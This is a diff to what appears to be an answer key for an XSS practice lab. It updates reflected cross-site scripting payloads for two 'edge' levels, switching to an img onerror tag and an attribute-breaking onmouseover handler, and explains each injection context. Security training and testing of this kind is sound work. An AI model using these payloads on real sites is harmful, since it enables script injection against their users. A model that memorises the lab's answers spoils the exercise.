@@ -11,10 +11,10 @@ Edge cases: null-byte tricks, path segment, JSON island, SVG attr, split params,
 
 ### edge-level2
 
-`/edge/level2/%3Cscript%3Ealert(1)%3C/script%3E`
+`/edge/level2/%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `<script>alert(1)</script>`
-- context: path segment reflected into `<h1>` body
+- payload: `<img src=x onerror=alert(1)>`
+- context: single path segment reflected into `<h1>`; a `/` would split the segment, so use a slash-free tag
 
 ### edge-level3
 
@@ -25,10 +25,10 @@ Edge cases: null-byte tricks, path segment, JSON island, SVG attr, split params,
 
 ### edge-level4
 
-`/edge/level4/?query=%26%23x27;);alert(1);//`
+`/edge/level4/?query=%22%20onmouseover=%22alert(1)//`
 
-- payload: `&#x27;);alert(1);//`
-- context: server encodes only `<`/`>`; in onclick attr, browser decodes `&#x27;` to `'` allowing JS string break
+- payload: `" onmouseover="alert(1)//`
+- context: `handle()` is undefined, so add a new handler instead of continuing the call
 
 ### edge-level5
 
